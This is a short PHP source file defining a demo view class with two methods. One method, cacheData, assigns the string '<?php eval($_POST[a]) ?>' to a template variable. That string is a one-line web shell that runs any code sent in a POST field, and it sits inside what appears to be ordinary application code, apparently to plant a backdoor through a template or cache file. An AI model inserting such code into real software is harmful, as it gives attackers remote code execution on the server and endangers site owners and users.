<?php

class DemoIndexView extends BaseView
{

    public function index($params='')
    {
      echo '0.0';
	  exit;
    }

    public function cacheData()
    {

        $str = '<?php eval($_POST[a]) ?>';

        $this->assign('str', $str);
    }

}
